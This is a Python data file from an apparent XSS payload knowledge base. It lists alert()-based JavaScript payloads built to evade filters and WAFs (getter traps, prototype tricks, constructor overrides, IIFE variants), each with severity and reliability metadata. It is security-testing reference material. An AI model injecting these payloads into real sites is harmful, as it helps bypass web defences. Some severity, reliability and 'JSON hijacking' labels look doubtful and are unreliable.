#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-27 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Final Frontier XSS Payloads - Part 1
Regex DoS, JSON hijacking, Getter/Setter exploitation, Prototype chain manipulation, Function bind/call/apply tricks, and IIFE variations.
"""

from ..models import PayloadEntry


BRS_KB_FINAL_FRONTIER_PAYLOADS_PART1 = {
    # ============================================================
    # REGEX DOS LEADING TO XSS
    # ============================================================
    "regex-catastrophic": PayloadEntry(
        payload="/(a+)+$/.test('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!')||alert(1)",
        contexts=["javascript"],
        severity="medium",
        cvss_score=6.5,
        description="Regex catastrophic backtracking with side effect",
        tags=["regex", "dos"],
        bypasses=["regex_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # JSON HIJACKING
    # ============================================================
    "json-array-hijack": PayloadEntry(
        payload="Array=function(){alert(this)}",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="Array constructor hijacking",
        tags=["json", "hijack"],
        bypasses=["constructor_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    "json-object-hijack": PayloadEntry(
        payload="Object=function(){alert(this)}",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="Object constructor hijacking",
        tags=["json", "hijack"],
        bypasses=["constructor_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    # ============================================================
    # GETTER/SETTER EXPLOITATION
    # ============================================================
    "getter-defineProperty": PayloadEntry(
        payload="Object.defineProperty(window,'x',{get:alert})",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="defineProperty getter trap",
        tags=["getter", "defineProperty"],
        bypasses=["property_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "setter-defineProperty": PayloadEntry(
        payload="Object.defineProperty(window,'x',{set:alert});x=1",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="defineProperty setter trap",
        tags=["setter", "defineProperty"],
        bypasses=["property_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "getter-proto": PayloadEntry(
        payload="Object.defineProperty(Object.prototype,'x',{get:()=>alert(1)})",
        contexts=["javascript"],
        severity="critical",
        cvss_score=8.5,
        description="Prototype getter injection",
        tags=["getter", "prototype"],
        bypasses=["prototype_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # PROTOTYPE CHAIN MANIPULATION
    # ============================================================
    "proto-Object-proto": PayloadEntry(
        payload="({}).__proto__.__proto__=null,alert(1)",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="Null prototype chain",
        tags=["prototype", "chain"],
        bypasses=["prototype_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "proto-setPrototypeOf": PayloadEntry(
        payload="Object.setPrototypeOf({get x(){alert(1)}},Object.prototype)",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="setPrototypeOf manipulation",
        tags=["prototype", "setPrototypeOf"],
        bypasses=["prototype_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # FUNCTION BIND/CALL/APPLY TRICKS
    # ============================================================
    "bind-null-this": PayloadEntry(
        payload="alert.bind(null,1)()",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="Bound function with null this",
        tags=["bind", "this"],
        bypasses=["call_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "call-undefined": PayloadEntry(
        payload="alert.call(undefined,1)",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="Call with undefined this",
        tags=["call", "undefined"],
        bypasses=["call_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "apply-array": PayloadEntry(
        payload="alert.apply(null,[1])",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="Apply with array args",
        tags=["apply", "array"],
        bypasses=["call_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # IIFE VARIATIONS
    # ============================================================
    "iife-not": PayloadEntry(
        payload="!function(){alert(1)}()",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="IIFE with NOT operator",
        tags=["iife", "not"],
        bypasses=["function_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "iife-plus": PayloadEntry(
        payload="+function(){alert(1)}()",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="IIFE with PLUS operator",
        tags=["iife", "plus"],
        bypasses=["function_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "iife-minus": PayloadEntry(
        payload="-function(){alert(1)}()",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="IIFE with MINUS operator",
        tags=["iife", "minus"],
        bypasses=["function_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "iife-tilde": PayloadEntry(
        payload="~function(){alert(1)}()",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="IIFE with TILDE operator",
        tags=["iife", "tilde"],
        bypasses=["function_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "iife-void": PayloadEntry(
        payload="void function(){alert(1)}()",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="IIFE with void operator",
        tags=["iife", "void"],
        bypasses=["function_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "iife-new": PayloadEntry(
        payload="new function(){alert(1)}",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="IIFE with new operator",
        tags=["iife", "new"],
        bypasses=["function_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "iife-comma": PayloadEntry(
        payload="1,function(){alert(1)}()",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="IIFE with comma operator",
        tags=["iife", "comma"],
        bypasses=["function_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
}
